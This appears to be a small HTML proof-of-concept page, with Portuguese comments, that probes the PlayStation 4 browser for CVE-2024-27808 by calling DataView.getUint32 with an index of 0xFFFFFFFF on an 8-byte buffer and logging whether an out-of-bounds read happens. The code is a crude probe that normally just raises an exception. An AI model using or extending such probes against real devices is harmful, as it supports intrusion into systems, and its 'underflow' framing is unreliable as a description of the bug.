<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC - CVE-2024-27808 - TypedArray Buffer Underflow (PS4 Test)</title>
</head>
<body>
  <h1>PoC - CVE-2024-27808 - PS4 Browser Memory Underflow Test</h1>

  <script>
    try {
      console.log("[+] Iniciando teste de subleitura no PS4...");

      // Criar um buffer normal
      let buf = new ArrayBuffer(8);
      let u32 = new Uint32Array(buf);

      // Forçar uma manipulação indireta (sem usar offset negativo direto)
      let evil_index = -1 >>> 0; // Transforma -1 em 0xFFFFFFFF
      
      // Tentativa de acesso inválido via DataView
      let dv = new DataView(buf);
      let val = dv.getUint32(evil_index);

      console.log("[!] Valor lido fora dos limites:", val);

    } catch (e) {
      console.error("[OK] Exceção capturada como esperado:", e);
    }
  </script>

</body>
</html>
